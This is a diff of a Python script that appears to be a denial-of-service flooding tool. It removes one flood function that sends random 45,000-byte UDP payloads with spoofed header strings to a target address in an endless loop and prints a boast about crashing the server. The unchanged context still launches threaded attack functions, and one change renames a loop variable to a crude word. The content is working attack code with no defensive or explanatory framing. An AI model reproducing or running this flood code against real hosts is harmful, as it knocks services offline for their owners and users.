@@ -923,37 +923,12 @@ def join2():
         except:
             s.close()
             print('[+] server error')
-  def ytta():
-    global useragent2, userip, acceptall
-    data7 = random._urandom(45000)
-    xx = int(0)
-    sikatall = "Sikat: "+random.choice(useragent2)+random.choice(acceptall)+"\r\n"
-    accept3 = random.choice(acceptall)
-    Userbyte = random.choice(userip)+random.choice(acceptall)
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    main_req = sikatall + accept3 + Userbyte + content + length
-    while True:
-          try:
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-             s.connect((str(ip),int(port)))
-             s.send(str.encode(main_req))
-             s.send(str.encode(data7))
-             for i in range(pack):
-               s.connect((str(ip),int(port)))
-               s.send(str.encode(main_req))
-               s.send(str.encode(data7))
-               xx += random.randint(0, int(pack))
-               print("SÉRVÉR {1} CRÂSH BY ZÁN")
-          except:
-              s.close()
-              print("[+] server error")
-             
+           
 for x in range(th):
    thred = threading.Thread(target=start)
    thred.start()
 else:
- for x in range(th):
+ for memek in range(th):
   thred2 = threading.Thread(target=attck)
   thred2.start()
 
